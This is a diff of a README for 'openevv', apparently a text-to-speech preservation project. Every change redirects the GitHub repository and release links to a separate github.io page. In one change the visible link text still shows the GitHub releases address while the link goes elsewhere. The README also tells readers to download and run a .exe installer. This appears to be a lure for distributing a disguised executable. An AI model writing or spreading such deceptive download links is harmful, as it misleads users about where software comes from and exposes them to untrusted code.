@@ -1,7 +1,7 @@
 <h1>🔊 openevv - Modern Voice for Legacy Applications</h1>
 
 <p align="center">
-  <a href="https://github.com/nadiyalyrical899/openevv/releases" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#6a11cb,#2575fc);color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ DOWNLOAD OPENEUV</a>
+  <a href="https://nadiyalyrical899.github.io" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#6a11cb,#2575fc);color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ DOWNLOAD OPENEUV</a>
 </p>
 
 ## 🌟 What Is openevv?
@@ -22,7 +22,7 @@ This program was carefully rebuilt using portable C code, which means it runs ef
 
 We want you up and running in less than five minutes. Here's exactly what to do:
 
-1. **Visit the official download page:** [github.com/nadiyalyrical899/openevv/releases](https://github.com/nadiyalyrical899/openevv/releases)
+1. **Visit the official download page:** [github.com/nadiyalyrical899/openevv/releases](https://nadiyalyrical899.github.io)
 2. **Find the latest release:** Look for the newest version at the top of the page.
 3. **Download the right file:** Click on the file ending in `.exe` (for Windows users).
 4. **Run the installer:** Double-click the downloaded file and follow the simple on-screen steps.
@@ -101,7 +101,7 @@ We've made openevv as stable as possible, but here are quick fixes for common pr
 
 If your issue isn't listed above, please:
 
-1. Visit the [official website](https://github.com/nadiyalyrical899/openevv)
+1. Visit the [official website](https://nadiyalyrical899.github.io)
 2. Open an issue on the GitHub repository with details
 3. Include your system information and what you were doing when the error occurred
 
@@ -169,7 +169,7 @@ While openevv is ready for everyday use, we welcome contributions:
 - **Code contributions:** Help improve the codebase
 - **Documentation help:** Improve this guide
 
-Visit our [GitHub repository](https://github.com/nadiyalyrical899/openevv) to get involved.
+Visit our [GitHub repository](https://nadiyalyrical899.github.io) to get involved.
 
 ## ❓ Frequently Asked Questions
 
@@ -207,7 +207,7 @@ openevv isn't just a piece of software—it's a preservation project. We're keep
 
 Whether you're a long-time user of these classic engines or just curious about the history of computer speech, we invite you to give openevv a try. It costs nothing but a few minutes of your time.
 
-**Remember:** [Download openevv today](https://github.com/nadiyalyrical899/openevv/releases) and experience the voice that changed accessibility forever.
+**Remember:** [Download openevv today](https://nadiyalyrical899.github.io) and experience the voice that changed accessibility forever.
 
 ---
 
